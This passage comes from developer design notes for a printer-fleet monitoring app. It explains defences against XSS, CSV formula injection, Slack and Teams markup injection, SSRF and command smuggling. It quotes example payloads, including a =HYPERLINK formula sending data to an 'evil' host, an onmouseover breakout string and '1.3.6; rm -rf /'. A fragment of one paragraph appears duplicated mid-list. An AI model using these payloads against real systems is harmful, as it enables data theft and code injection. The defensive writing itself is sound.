  record still reaches an ancestor's handlers regardless of that ancestor's
  level (`Logger.callHandlers` consults handler levels only) — which is what
  lets our INFO out while a library's stays in. **It does not fight uvicorn**:
  `Config.__init__` applies its `dictConfig` before `load()` imports the app and
  names only the `uvicorn*` loggers (no `root` key, `propagate: False`), so
  configuring at import neither clobbers nor duplicates. **`LOG_LEVEL` is env,
  not a DB-backed setting**, because the first thing worth logging is a database
  that will not answer. A typo costs a preference, never a boot.
  `tests/test_logging_config.py` asserts on captured *output* — the failure
  being guarded is a configuration call that runs and still emits nothing — and
  one of its subprocess cases reproduces the old broken state so the suite fails
  if the wiring is reverted.
- **Audit trail** — every login (incl. failures with attempted username),
  settings change (key names only), user/agent/printer/subnet CRUD, approvals,
  alert acks, agent updates, portal reports, backup downloads / restores are
  recorded in `audit_log` with `(ts, user_id, username, ip, action, target,
  detail)`. Admin-only viewer at `/manage/audit` with a substring filter.
- Agents are managed entirely in the UI: enroll (key shown once), assign
  subnets/SNMP under Agents (discovery status lives on each subnet row), update
  via the `update_agent` command. Versions are `0.1.0+YYYYMMDD-HHMMSS` — the
  suffix is the install timestamp, changes on every self-update.
- Auth is pluggable: local username/password always works; OIDC/SSO turns on
  from Settings, matching/provisioning users by email. (Use your IdP for MFA;
  this project doesn't ship its own TOTP.)
- The **customer portal** at `/portal` is the home for `client_readonly` users:
  trimmed view of their fleet with friendly names, "your supplies last ~Nd"
  forecasts, open issues, and a "Report a problem" form that opens a FreeScout
  ticket via the existing channel (or falls back to alert-email recipients).
- **Per-client white-label** (`clients.brand_name` / `brand_logo_url` /
  `brand_primary_color`, `central/branding.py`) overrides the global `app.*`
  branding **per field** — an unset column inherits, so a client with nothing
  configured renders exactly as before. It applies to the customer-facing
  surface only: every page a `client_readonly` user reaches, plus
  `/portal?client_id=N` when staff preview one. Staff pages keep the global
  chrome, because a nav bar that turns into the customer's logo reads as "you
  are inside their system". **Alert email, tickets and reports stay global** —
  channels are shared across tenants and digests span several, so a message
  branded as one customer is branded as the wrong one for everyone else on
  that channel. Two sinks make this a security surface, not a cosmetic one:
  `primary_color` lands in a CSS declaration, where escaping stops an
  attribute breakout but not `red; background-image: url(https://attacker/)`,
  so it is **validated against `#rgb`/`#rrggbb` on input and re-checked at
  render**; and the logo is a file served from our own origin, so the **bytes
  decide** (`sniff_image_type`, four raster formats), SVG is refused outright
  as a script-carrying document, and anything already stored goes out with
  `nosniff` + a sandboxing CSP. There is **one** uploader, shared with Settings
  → Branding, storing into `app_assets` under `client:<id>:logo`; that row has
  no FK, so deleting a client deletes it explicitly — SQLite reuses row ids and
  the next client would otherwise inherit the logo. Serving is tenant-scoped
  (404, never 403, so ids can't be probed).
- **HTML escaping is not JS escaping**, and an inline event handler is a script
  context wearing an attribute's clothes. A value interpolated into
  `onsubmit="return confirm('Delete {{ name }}?')"` is autoescaped to `&#39;`
  — and the HTML parser decodes that back to a quote *before* the attribute is
  compiled as script, so the string literal closes and the rest executes. Pass
  such values in a `data-` attribute and read them through `dataset` instead;
  then they are only ever data. `client_manage.html` does this;
  `tests/test_client_branding.py` asserts it. `events.html` takes the other
  valid route — `'…' + {{ s.name|tojson }} + '…'` — since Jinja's `tojson`
  emits `<`-style escapes that survive the attribute decode as data.
  **All of these are now fixed** — zero `on*` attributes in any template
  interpolate a Jinja expression, and `tests/test_template_js_injection.py`
  scans for it so the count cannot grow again. (This paragraph read "fourteen
  still interpolate raw — not yet fixed" long after they were, while a line
  further down said "all 16 sites are now fixed". Two claims, one file,
  opposite answers.)
- **Escaping is per wire format; one shared `escape()` across the channels would
  be the bug, not the fix.** Every channel receives the same device-controlled
  strings (`printers.model`, `hostname`, `serial` off SNMP; portal free-text)
  and each renders them in a different language, so each `build_payload` carries
  its own `_esc`:
  - **FreeScout** renders a thread body as raw HTML (`safe_raw_html`), so values
    are entity-encoded there **per value, never on the assembled string** — the
    `<br>` separators are ours and escaping afterwards would print them as
    literal text. Its **subject is deliberately left alone**: Blade renders it
    through an escaping echo, so encoding would double-encode and put
    `Bob&#x27;s &amp; Co` in every ticket list and Subject line.
  - **Slack** gets exactly three replacements (`&` first, then `<`, `>`) and
    **not** `html.escape` — Slack decodes only those three and warns against
    encoding more, so quote-escaping leaves a literal `&#x27;` in every printer
    named after somebody's office. The hole being closed is real: `<!channel>`
    pages an MSP's ops room, and `<https://evil|https://help>` forges a link the
    team trusts because the monitoring bot sent it. Attachment **field values**
    are escaped too, not just the top-level text.
  - **Teams** connector cards render limited HTML *and* Markdown, so a value is
    live markup twice: entity-encode, then backslash-escape `\ [ ]`. **The
    backslash goes first** — otherwise `\[x](u)` yields a rendered backslash
    plus a *live* link. Emphasis and headings are left alone; they restyle text
    but never redirect it.
  - **The generic webhook is verbatim on purpose.** It composes no document,
    `json.dumps` encodes the value completely, and escaping would corrupt it for
    a subscriber that stores or matches on it — that belongs at the
    subscriber's own output boundary. Say so in the code, or it gets "hardened"
    later.
  - Escaping lives in `build_payload` at the wire boundary, **not** in the
    `Notification`: `notification_payload()` freezes raw values for the retry
    path, so encoding there would double-encode on every retry.
  - The same pass fixed a device-driven *delivery outage* the audit had missed:
    a multi-line HP `sysDescr` in `printers.model` reached the email `Subject`
    header, `email.policy.default` correctly refuses CR/LF, the `ValueError`
    escaped `build_message`, and every such alert recorded
    `DeliveryStatus.failed` with no mail sent at all. **Refusing is not
    handling.** To/From stay untouched — those are operator-configured addresses
    and silently rewriting one is worse than refusing it.
- **CSV: RFC 4180 quoting is not a defence, and a number is never touched.**
  `csv.writer` escapes commas and quotes correctly and passes
  `=HYPERLINK("http://evil/"&A1,"click")` through perfectly intact, whereupon
  Excel, LibreOffice and Sheets all *evaluate* it — and the cells at risk are
  `model`/`hostname`/`serial`/`brand`, i.e. bytes controlled by anyone who
  controls a printer, landing in a billing CSV an MSP opens by hand.
  `central/csv_safe.py` owns the one rule: `safe_writer()` is a drop-in for
  `csv.writer` that neutralises **every** cell including the header, so a column
  added later is covered by construction rather than by its author remembering.
  Two decisions worth keeping: the numeric exemption is a **closed-form decimal
  grammar, not `float()`** (which also accepts `-inf`, `-nan`, `-1_0`, none of
  which is a number to a spreadsheet), because page counts and period deltas
  legitimately start with `-` and escaping them breaks the arithmetic in the
  spreadsheet the export exists to feed; and `None` exports as a **blank cell,
  never the string "None"**, because the billing CSV relies on blank-not-zero to
  avoid billing a meter the device never reported as zero.
  compiled as script, so the string literal closes and the rest executes.
  Escaping ran and did nothing. Pass such values in a `data-` attribute and read
  them through `dataset`; then they are only ever data. **All 16 sites are now
  fixed** (agents ×6, printer ×2, events ×2, maintenance, manage_users,
  suppression, alert_rules, billing, definitions), and
  `tests/test_template_js_injection.py` scans every template so a new one cannot
  reintroduce the shape — the scan is the guard, the individual fixes are not.
  Two things worth not re-learning:
  - **`|tojson` is NOT the fix, and shipping it as one opened a second hole.**
    It escapes `<`, `>`, `&` and `'` but **not** `"`, and it emits the JSON
    string's own surrounding double quotes — so inside a *double-quoted*
    attribute its first character **terminates the attribute** and everything
    after it parses as more attributes on the tag. An event subscription named
    `a" onmouseover="alert(1)` rendered a genuine `onmouseover` handler on the
    form (verified against a real HTML parser). `tojson` is safe in a `<script>`
    block or a single-quoted attribute, and nowhere else. The rule is therefore
    a bright line — **no Jinja expression of any kind inside an `on*` handler** —
    because "escape it correctly for the nested context" is a rule that gets got
    wrong, and got wrong twice here.
  - **Most of these were remotely triggerable, not self-XSS**, which was checked
    rather than assumed and came out worse than it looked. `printer.ip` and
    `subnet.cidr` are bare `str` on both the ingest schemas and the operator
    forms — `ipaddress` is called only at *read* time, never as an input gate —
    so an IP is arbitrary text an agent can push. `agents.name` embeds the
    agent's **self-reported hostname** from claim-code redemption (`services.py`
    calls it "machine-reported and therefore untrusted", length-caps it, and
    does not character-restrict it). `users.username` is written straight from
    the IdP payload when SCIM is on. Only the rate-card, schedule, window, rule
    and definition names are purely operator-typed.
  - The same class was swept for beyond `confirm()`: no `|safe`, no `Markup(`,
    no `javascript:` URLs, no interpolation in any `<script>` block, and no
    `hx-vals`/`hx-on*` anywhere. Two adjacent gaps were closed at the same time
    — `app_branding` now re-checks `logo_url` through `safe_logo_url` (the
    per-client path always did; the global one did not, and it renders on the
    **pre-auth** login page), and `level_bar` coerces its percentage with
    `| float` so the CSS sink is structurally safe rather than accidentally so.
  - **Still open, and deliberately not decided here: there is no CSP on
    dashboard HTML.** `main.py` sets no `Content-Security-Policy`,
    `X-Frame-Options` or `X-Content-Type-Options`; the only CSP in the tree is
    scoped to branding image assets. A CSP would have made every instance of
    this bug class a no-op. The catch that makes it a real decision rather than
    a missing header: this app's confirm dialogs *are* inline handlers, so
    `script-src 'self'` breaks them and `'unsafe-inline'` would defeat the
    point — adopting one means moving those handlers to a listener in a served
    JS file first.
- **Printer friendly names** (`printers.display_name`) are used everywhere a
  printer is named — dashboards, alert titles, recent activity, the weekly
  report. Operators set them in the printer edit form.
- Maintenance schedules at `/manage/maintenance`: per-printer or model-wide
  with interval-days and/or page-threshold and `next_due`. **Mark serviced**
  rolls `next_due` forward by `interval_days` and the worker's next
  reconcile pass auto-resolves the maintenance-due alert.
- DB **backup & restore** from the UI at `/admin/backup` (admin only).
  Postgres: `pg_dump --format=custom` / `pg_restore --clean`. SQLite: streamed
  file copy + atomic replace. Restore is gated behind typed `RESTORE`
  confirmation.
  - **libpq does not understand SQLAlchemy's `+driver` suffix**, and the failure
    is silent in the worst way. A conninfo string that does not begin *exactly*
    `postgresql://` or `postgres://` and contains no `=` is taken by libpq as a
    bare **database name**, so host, port and user all fall back to defaults.
    Handing `postgresql+psycopg://…` straight to `pg_dump --dbname` does not
    error on the scheme — it quietly tries a local unix socket as the
    container's OS user, fails with `role "root" does not exist`, and leaves a
    **zero-byte** dump behind. Backup and restore had therefore never worked on
    Postgres at all. `backup_routes.libpq_target()` is the one place that
    rebuilds the DSN (`URL.create(drivername="postgresql", …)`, query params
    preserved so a deployment pinning `sslmode=require` keeps it). It also moves
    the password into **`PGPASSWORD`**, because the whole URL used to be one
    argv element and `ps` discloses argv to every local user — the same rule
    this project already enforces for the Windows service command line and the
    macOS LaunchDaemon plist.
- **Onboarding** (`/manage/onboard`) creates client → site → subnet → claim code
  in one transaction. Four mechanisms, each with a rule worth keeping:
  - **`subnets.trusted`** is the *only* path that puts a device in a tenant's
    fleet with no human. It's per-subnet, not global, because the subnet row is
    an existing deliberate act (somebody typed that CIDR and its creds).
    Unknown provenance — an unenrolled CIDR, or a legacy agent reporting none —
    always queues, and every auto-approval writes a `printer.auto_approve`
    audit row. Marking a subnet trusted **never** sweeps the existing backlog:
    those rows may carry a decision a human already made.
  - **Claim codes** (`agent_claim_tokens`) replace carrying a long-lived API key
    to site. Single use enforced as a *conditional UPDATE* on `used_at` (not
    read-then-write, so two boxes from one image can't both win), short TTL,
    SHA-256 at rest, and `site_id` fixed at mint time — a bearer credential must
    never let its holder pick a tenant. Failures are deliberately
    indistinguishable (unknown / expired / spent all 401) so it isn't an oracle.
    The agent persists its issued credentials **atomically before first use**:
    the code is single-use, so an agent that redeems and forgets is bricked.
  - **Subnet adoption** on redemption: an agent claims its site's `agent_id IS
    NULL` subnets only. Never an assigned one (no stealing), never another
    site's. This is what makes declaring the subnet before the agent exists work.
  - **Onboarding defaults** (`onboarding.*` settings) apply once at client
    creation and are then owned by the client — re-applying would overwrite
    thresholds an operator tuned, which is how people learn to distrust
    defaults. What was created is audited (`client.defaults_applied`).
- **The driver tier answers "does this printer need a driver at all", and the
  answer has five values, not two.** Driver installation is what strands most
  workstation setups, and since KB5005652 (Aug 2021) the reason is *privilege*,
  not packaging: `RestrictDriverInstallationToAdministrators` defaults to 1, so
  Point and Print demands local admin — the user hits a UAC prompt they cannot
  satisfy, and the usual escape (setting it to 0) reopens PrintNightmare. The
  workstation client therefore never uses Point and Print; it runs as
  **LocalSystem** and installs on the user's behalf. Driverless is not a
  compromise: as of **2026-07-01** Windows ranks its inbox IPP class driver
  ahead of third-party drivers by default. `ipp_disabled` is deliberately not
  folded into `driver_required` — a refused port 631 is a checkbox in the
  device's web UI, and reporting it as "needs a driver" sends a technician to
  entirely the wrong place. **`driver_tier` (observed) and
  `driver_tier_override` (operator's decision) are separate columns** so a
  re-probe refreshes what we saw without discarding what a human decided, and
  the UI can show both. A reading *without* driver fields means "no new
  information", never "unknown" — probing is throttled to roughly daily while
  SNMP polls run every few minutes, so treating absent as unknown would blank a
  correctly-probed printer on the next routine poll. Only the two actionable
  tiers are pinnable; the rest describe a failure to reach the device.
- **End users are not operators, and the two tables must stay apart.** `users`
  are dashboard operators: globally-unique usernames, password hashes, roles,
  session auth. `end_users` are the customer's staff — tenant-scoped (two
  customers each having a "jsmith" is normal, so global uniqueness breaks on the
  second customer), arriving in the thousands from a directory sync, and never
  logging in here. Folding them together would force a uniqueness rule the real
  world violates on day one and would put non-login rows in the table the auth
  path scans. The URLs keep the distinction visible: **Users** administer the
  system at `/manage/users`, **People** print things at `/manage/people`.
- **Printer assignment tenancy is a service-layer invariant, by necessity.**
  "The printer and its target belong to the same client" spans three tables, so
  no CHECK can state it; it lives in `services.assign_printer` /
  `sync_group_members` and every route goes through them. A cross-tenant attempt
  raises `TenancyError` (its own type — a form typo and a reach into another
  customer's fleet are different events) and is audited as
  `printer_assignment.refused`. What the schema *does* enforce is shape: a
  CHECK that an assignment targets exactly one of user/group. Denormalising
  `client_id` onto the row would let the DB carry tenancy, but it would drift
  the moment a printer moves between clients — a checked invariant traded for a
  silently stale one.
- **Directory sync providers return a snapshot; they never write.** Three
  sources (Entra, Google, on-prem AD) with three wire protocols and one job:
  hand back `DirectorySnapshot(users, groups, complete)`. Every sync rule then
  lives once in `directory/sync.py` instead of three times, and the whole engine
  is testable with a hand-built snapshot — which matters because no CI runner has
  an Entra tenant. The rules that must not regress:
  - **Match on `directory_id`, never email.** Emails change; object ids don't.
    Email-matching turns a married employee into a leaver *plus* a stranger and
    strands their assignments on the dead row.
  - **`manual` rows are untouchable.** Operators hand-create contractors and
    shared accounts; a sync that adopts or deactivates them makes the manual
    path untrustworthy. An email collision is **reported, not adopted** — a bad
    match (shared mailbox, alias) merges two people irreversibly, skipping is
    recoverable.
  - **Deactivate, never delete**, and `complete=False` deactivates *nobody* —
    absence means "gone" only if the fetch finished, else a paging failure reads
    as mass resignation. Deleted groups are **emptied, not dropped**: they may
    carry operator-made printer assignments.
  - Secrets live in `directory_connections.secret` (Fernet), never in `config` —
    `config` is rendered in the UI, echoed in audit detail and dumped in
    diagnostics; the only way to keep a credential out of all three is for it to
    live where those paths never read. Provider errors store a **sanitised**
    string (transport errors quote URLs and echo credentials).
  - **On-prem AD queries the DC from central**, which needs routable reachability
    (single-tenant, bridged-at-HQ, or VPN). A DC behind a customer firewall needs
    the query relayed through the site agent — not built; the provider interface
    is the seam, since a relayed variant returns the same snapshot.
- **Effective printers resolve deterministically.** `effective_printers_for`
  merges direct and group-inherited assignments; **direct beats group** (somebody
  singled this person out — more specific than "they're in Accounting"), and
  exactly one default comes back, tie-broken by lowest printer id. Last-writer-
  wins would make a workstation's default printer depend on dict ordering.
  Inactive users resolve to **nothing** while keeping their rows, so
  deprovisioning takes effect immediately and history survives.
- **Device definitions are DATA the agent interprets, never code it runs.** A
  new printer model whose supply levels live only in a vendor-private OID used
  to need a new *provider* — Python, in the agent package, shipped by a release.
  `device_definitions` moves the model-specific part into a row an operator
  writes at `/manage/definitions`, which agents fetch, cache and apply. The
  rules that make that safe rather than merely convenient:
  - **No regular expressions, ever**, and that is a design decision rather than
    an omission. A pattern supplied by a definition runs on every agent in the
    fleet, and there is no way to inspect an arbitrary pattern and prove it is
    not catastrophically backtracking — so one bad row stalls the whole fleet at
    once. Extraction is `text_between`, which slices between two **literal**
    delimiters and is linear whatever an operator types. A definition carrying
    `regex`/`pattern`/`re`/`eval`/… is refused *by name* so the message reads as
    a decision. Same stance as the workstation client's PowerShell rule: make
    the question moot instead of handling it.
  - **Closed vocabulary, unknown keys refused, everything bounded.** Six decode
    kinds; OIDs validated by a character loop (not a regex — this is the gate
    that keeps `1.3.6; rm -rf /` out of an SNMP call); caps on payload bytes,
    definition count, OIDs, map entries, string lengths and JSON depth. The
    depth check is **iterative**, because a recursive one over hostile input
    raises `RecursionError` from somewhere unrelated and the guard becomes the
    failure.
  - **Validated on ingest AND on the agent**, on receipt and on every cache
    load. Central signs the feed, and a signature proves who produced bytes, not
    that the bytes are safe — an agent must be able to defend itself against a
    central it authenticates.
  - **Built-ins run FIRST; a definition runs LAST and fills only.** This is the
    precedence decision, and registration order in `providers/__init__.py` is
    what enforces it. Built-in providers are hardware-proven; a definition is
    data that has never executed anywhere, so it may fill a `level_pct` that is
    still `None`, add a row nobody produced, and fill absent meters/status —
    and may **not** replace a value a built-in established. `override_builtin`
    is the deliberate exception (a built-in that decodes one model wrongly is
    exactly what you want to fix without a release): default off, an operator
    checkbox, audited, and every displaced field is named in `provider_trace` on
    that printer's own detail page. The contract is "never **silently**", not
    "never".
  - **One definition per printer; an exact tie is refused.** Most specific wins
    (model tag, then brand, then enterprise, compared as a tuple so a model
    criterion always beats a brand one). Two definitions over one device's
    supply rows is a coin flip whose losing side looks exactly like data — same
    discipline as an ambiguous driver-package match. A definition with **no**
    match criteria is refused outright: it would point one vendor's private MIB
    at every printer in every client.
  - **A changed feed carries the FULL set, not a delta.** A delta needs
    tombstones, and a missed tombstone leaves a *withdrawn* definition running
    on an agent forever — precisely the failure this design exists to prevent.
    The version is a content digest, so an unchanged feed transfers nothing
    (`{"version": v, "changed": false}`), which is the steady state on every
    poll of every agent. Deletion changes the digest, so withdrawal actually
    takes effect.
  - **Scoped per agent.** Global definitions (hardware knowledge, `client_id IS
    NULL`) plus those scoped to clients the agent actually collects for, so one
    tenant's custom definition never reaches another's site. Note the trap the
    schema hides: `UNIQUE(key, client_id)` does **not** stop duplicate *global*
    keys, because SQL treats NULLs as distinct — a partial unique index over
    `client_id IS NULL` is what enforces it, declared in both the model and the
    migration.
  - **Degrading is the default.** No definitions → `detect()` is False and the
    provider is never entered, not even a trace row; the reading is byte-for-byte
    what the pre-feature agent produced. A failed fetch, a refused signature or
    a malformed feed keeps whatever is already active — failing *forward* into
    "no definitions" would let anyone who can break the response turn the
    feature off fleet-wide.
- **The outbound event bus is the integration surface, and it never holds
  commercial state** (`central/events/`). PSA integration was dropped on purpose
  — FreeScout stays the ticket path — so this is how an MSP wires Printer Nanny
  into their own ERP, procurement or automation: a small set of documented,
  versioned event types rather than Printer Nanny growing a model of their
  business. Four rules that must not regress:
  - **The signature is Stripe's scheme, not GitHub's**:
    `t=<unix>,v1=<hex>` over `b"<t>." + <the exact request body bytes>`. HMAC
    over the body alone proves only that someone held the secret, so a captured
    request stays valid **forever**; and a timestamp in a *separate* header is
    freely rewritten because the MAC does not cover it. Putting `t` inside the
    signed material binds the body to a moment. `v1=` is a label rather than a
    fixed name, so a future `v2=` ships **alongside** it and consumers migrate
    one at a time. It is also the most widely implemented webhook signature
    there is, which matters more than elegance: the property is only real if the
    consumer actually verifies, and the cheapest verification is the one they
    have already written.
  - **Tenancy is checked twice** — at fan-out and again immediately before send
    — because a subscription's scope is editable, and re-scoping a global
    subscription would otherwise ship other tenants' already-queued events.
  - **SSRF has two tiers, and only one is overridable.** Link-local (including
    `169.254.169.254`), unspecified, multicast and reserved are refused with
    **no override**; loopback / private / CGNAT are refused by default but
    settable, because the likeliest subscriber is the MSP's own box on the same
    LAN and a blanket refusal just gets worked around. Redirects are never
    followed.
  - Payloads carry **no secrets and no unescaped device strings** — every value
    passes the catalogue's one normalisation on the way in.
- **Collector redundancy is a lease, and split brain is the entire problem**
  (`central/collector.py`, `subnets.collector_agent_id` /
  `collector_lease_expires_at`). PrintFleet publishes that 10-20% of collectors
  stop working at some point, and before this a dead site agent just meant
  frozen data. Two collectors sweeping one subnet is **not** a cosmetic
  duplicate: billing sums *positive* page-count deltas over readings ordered by
  an agent-stamped `ts`, so two collectors with a few seconds of clock skew
  produce 100, 110, 105, 110 — and every recovery re-charges pages already
  billed. Measured, not asserted: 20 billed pages where the truth is 10. Three
  layers, and each covers something the others cannot:
  - **Ownership changes only through a single-row conditional UPDATE** whose
    WHERE states what the row must still look like, with **rowcount as the
    interlock** — the same discipline as the single-use claim code, never
    read-then-write. That alone gives at most one holder *per central*.
  - **The holder enforces its own expiry**, because central's answer only binds
    an agent that can hear it — and an agent that loses central while still
    reaching printers keeps polling **by design** (`runner.TargetCache` exists
    precisely so an outage does not punch a hole in the meters). The agent
    anchors on `time.monotonic()` sampled **before** it sends the heartbeat and
    treats the grant as expiring at that instant + `lease_seconds`; central sets
    the row's expiry at *its* now + `lease_seconds`, which is necessarily later
    because the request had to travel. So agent deadline ≤ central expiry,
    always, with **no assumption that the two clocks agree** — each measures a
    duration on its own.
  - **Ingest refuses a reading from a non-holder** (`admits()`), which is what
    protects the append-only table from an agent too old to know what a lease
    is, a hand-rolled client with a stolen key, and any future bug above it. One
    exception: the immediate predecessor replaying its spool for the period it
    *did* hold the lease, because those readings are strictly older history and
    dropping them punches the very hole the spool exists to prevent.
  - **Only the worker moves a lease between agents.** A heartbeat may renew its
    own or pick up one nobody holds, never take one — so no amount of agent-side
    eagerness displaces anybody. The worker's write is a compare-and-swap
    re-asserting holder *and* expiry, because every check it made is stale by
    write time: a slow primary renews, the CAS misses, nothing moves. And the
    holder must **look gone** — offline *and* silent for
    `collector.takeover_after_seconds`, deliberately longer than the offline
    grace, so "briefly missed a heartbeat" and "stopped working" stay different
    events. Same conservatism as `services.adopt_by_name`.
- **Checkbox booleans need a presence marker.** An unchecked box posts nothing,
  so a handler that ignores empty fields (`subnet_update`) cannot tell "unchecked"
  from "this form didn't carry the field" — reading it directly makes an inline
  rename silently clear the flag. `trusted` pairs with a hidden `trusted_present`;
  `runtime.save_settings` solves the same problem with its `sections` argument.
  Same failure class as the `save_settings(sections=None)` wipe.
- **Yield-gap detection measures a cartridge, and the finding is an accusation**
  (`central/supply_yield.py`, `supply_cycles`, `supply_yield_expectations`,
  `/supplies/yield`). A persistent shortfall in pages-per-cartridge is the
  non-OEM / refill signal, and a false positive tells an MSP their customer buys
  grey-market consumables. Everything below follows from that asymmetry:
  - **A cartridge change is a level that RISES**, LibreNMS's cheap trick, and the
    only signal a printer gives. That test is `supplies.refill_boundaries`,
    shared verbatim with the depletion forecast — which needs the *last*
    boundary where this needs *every* one. Two copies could disagree about where
    a cartridge started and credit its pages to its predecessor, with nothing
    anywhere reporting it.
  - **Persist the measurement, compute the judgement**, the same split as
    `reorder.py`. A cycle cannot be recomputed once its raw readings age out (a
    drum outlives the 90-day window), so it is a row; the verdict is derived on
    read, so a threshold change lands on the next render and there is no stale
    verdict to reconcile when a cartridge is swapped.
  - **A day is read from exactly one source, and never from none.** Rollups
    below `retention.effective_raw_days`, raw readings above it — *plus* raw
    readings below it for days no rollup covers, because deletion ships OFF and
    the rollup pass works forward from a watermark a bounded number of
    printer-days per cycle. Reading only rollups there discarded real history
    silently: the cartridges with the most history were measured over the least
    of it. Found by the end-to-end smoke, invisible to every unit test above it.
  - **Expected yield has two sources and states which one it used.** An
    operator's datasheet figure per model tag beats a fleet-derived MEDIAN
    across *other* printers of the same model. The subject is excluded from its
    own baseline, or a printer running non-OEM calibrates the expectation to
    itself. The baseline's weakness is stated in the UI rather than buried: a
    fleet where every unit of a model runs non-OEM calibrates to non-OEM and
    finds nothing.
  - **Absence is neither a finding nor a clean bill of health.** Under
    `yield.min_cycles` (3) completed cartridges the row reads *insufficient
    data* and shows the measurement without a verdict; with no expectation it
    reads *no expected yield*, never *within expected*. Same correction the
    security-posture report needed. Thresholds are clamped on read, so a
    hand-edited `app_settings` row cannot turn one cartridge into a finding.
  - **The replacement log is deliberately NOT written to `printer_events`.**
    That table is the counting source for occurrence-rate rules, and a rule
    matching everything above a severity would start counting toner changes as
    printer faults — a new feature silently changing an existing one's numbers.
  - Staff-only, like `/security/posture` and for the same reason: every useful
    response to a shortfall is an MSP conversation, not a self-service page.
- **Money is `Decimal` end to end, and `Numeric` alone does not deliver that.**
  A cost-per-page rate is six decimals and an invoice multiplies it by five-figure
  page counts, so a float round trip shows up as an invoice whose lines stop
  adding up to its own total. SQLAlchemy's `Numeric` is exact on Postgres and
  *not* on SQLite — which is where the whole suite and every dev install run, so
  the arithmetic would be verified against the wrong storage. `central/money.py`
  therefore stores NUMERIC on Postgres and a **zero-padded fixed-scale string**
  on SQLite (padded so text ordering equals numeric ordering), and it overrides
  `bind_processor`/`result_processor` to stop the impl chain: `Numeric.bind_processor`
  returns `processors.to_float` on any dialect whose `supports_native_decimal` is
  False, which is the inherited default on *both* `PGDialect` and `SQLiteDialect`.
  Neither supported backend reaches that line today; the override is what keeps
  that from being contingent on a dialect internal nobody re-checks. Two rules
  come with the SQLite variant: **never SUM/AVG a money column in SQL** (it is
  text there, and SQLite would coerce to float — all arithmetic happens in Python),
  and a CHECK on a money column is **vacuous** on SQLite (text always compares
  greater than a number), so non-negativity is enforced at the parse point instead
  of pretended in the schema.
- **The rounding rule is half-up, at the invoice line, once.** Python's default
  is banker's rounding, which is not what an invoice does or what a customer with
  a calculator expects. Pages × a six-decimal rate and every graduated band stay
  at full precision; the single quantization lands on the line amount, and the
  invoice total is the exact sum of already-rounded lines — so the printed lines
  always add up to the printed total. Rounding per *page* instead drifts by up to
  half a cent times the page count: 40,000 pages at 0.0085 bills $400.00 rather
  than $340.00, a $60 artefact of nothing but the rounding rule.
- **Billing extends the blank-vs-zero discipline the CSV started.** A meter the
  device did not report in the period is `None`, never 0 — `queries.period_meters`
  returns one or the other and the engine has a branch for each. A device
  reporting mono but not colour is billed for its mono pages only, with the
  remainder disclosed as *unbilled* on the invoice; a device reporting neither is
  priced only if the rate card carries an explicit `unsplit_policy` saying so.
  That policy is a stored operator decision rather than an inference because
  "colour = 0" is right for a mono laser and catastrophically wrong for an MFP
  whose colour meter failed to decode — and it deliberately does **not** cover the
  partial-split case, since pages a device did not call mono are by definition not
  mono. Period deltas are reset-safe (positive steps only), so a firmware reflash
  or a replacement device on the same row contributes 0 rather than a large
  negative that would cancel out a month of real printing.
- **Volume bands are graduated, and at most one rate card per client is active.**
  Marginal bands (each covering only the pages between the previous ceiling and
  its own, with the card's base rate above the highest) rather than
  whole-volume-at-the-qualifying-rate, because the latter is non-monotonic —
  printing one more page can lower the bill — and an invoice nobody can explain is
  worse than one that is slightly less generous. It also removes the unbounded
  tier row somebody would eventually forget to add. The single active card is a
  **partial unique index**, not a convention: with two, "which card produced this
  invoice" has no answer and the rates depend on row order.

## Dev
- `pip install -e ".[dev]"` (add `postgres` / `agent` / `agent-mdns` extras as needed).
- `python -m central.seed` — create tables + load demo data (SQLite by default).
- `uvicorn central.main:app --reload` — API + dashboard at http://localhost:8000.
- `python -m central.worker.run` — background worker loop (alerts, reports,
  forecasts).
- `python -m central.worker.run --once` — single cycle, useful in CI.
- `docker compose up` — full stack (Postgres + api + worker + dashboard + Caddy).
- `alembic upgrade head` — apply migrations (Postgres).
- `python -m central.enroll --client … --site … --agent … --subnet … --json` —
  mint an agent + key server-side (used by setup scripts / `docker compose exec`).
- `python -m central.seed --minimal` — clean slate (admin/tech + alert rules,
  no demo data) for real-equipment testing.
- Local agent (same box as central): `scripts/setup-local-agent.sh` (one-shot) or
  `scripts/install-local-agent-macos.sh` (persistent launchd). Docker Desktop
  containers can't reach the LAN, so the local agent runs on the host; on Linux
  the optional `agent` compose profile runs it host-networked. SNMP to LAN peers
  needs an unsandboxed shell.
- `printer-nanny-agent probe <ip>` — dumps standard + vendor private-MIB
  subtrees + decoded Brother maintenance blob percentages. Use this against
  any printer that needs a new/extended provider — paste the output as the
  starting point.
- **Stop hook** (`scripts/stop-hook-git-check.sh`, registered in
  `.claude/settings.json`): refuses to end a Claude Code turn with uncommitted,
  untracked, or unpushed work — this container is ephemeral, so unpushed work is
  lost work. It exists in the repo because the cloud environment provisions its
  own copy at `~/.claude/stop-hook-git-check.sh` and **regenerates it every
  session**, so fixing that copy in place never survives.
  The bug worth not reintroducing: both checks originally scoped to
  `"$upstream..HEAD"` — commits not on *this branch's* remote ref — when they
  mean commits not on *any* remote. `origin/<branch>` does not move when a PR
  merges, so a branch restarted from the merged `main` (the documented way to
  start follow-up work) enumerated the merge commit as "unpushed", then advised
  rebasing a commit authored by `noreply@github.com` — rewriting merged public
  history to silence a false positive. The range is `HEAD --not
  --remotes=origin`. The signature check is additionally gated on the checkout
  already using Anthropic's committer identity, since this hook is checked in
  and would otherwise block every turn for a human contributor committing as
  themselves. `scripts/patch-launcher-hook.sh` runs at SessionStart and
  reconciles the provisioned copy; it touches only that one path, only when it
  matches the known-buggy shape, and is idempotent. Delete both the script and
  its settings entry if you'd rather the provisioned hook were left alone.
- `pytest` — full suite. ruff via `ruff check central agent tests scripts migrations`
  — the same paths CI lints. Omitting `scripts/` here (as this line used to) means
  a local run can pass while CI fails on a file you never checked.

## Status
**Every feature described below is built. What varies is how much of it has been
run against the real thing**, and that is the distinction worth carrying at the
top of this section, because the three halves of this system sit at three
different levels of proof:

- **The site agent and the whole central surface run in production.** Treat these
  as verified.
- **The macOS workstation client is verified against a real CUPS scheduler, a
  real `pkgbuild`, and — since 2026-07-30 — a real Mac: an actual
  `installer -pkg`, the LaunchDaemon running as root, and a page out of a real
  printer.** See below for exactly which parts, and what is still untouched.
- **The Windows workstation client has now executed against a real spooler, in
  the LocalSystem service context, as of 2026-07-30** — and that one run found
  **three** defects, two of them features that had never worked at all. It is no
  longer unverified; it is also not proven, because one real printer still cannot
  be printed to for reasons not yet identified. Everything above
  `PowerShellRunner` is still a fake in CI.
  `deploy/WINDOWS-MSI-TESTING.md` now records what ran, what it found, and what
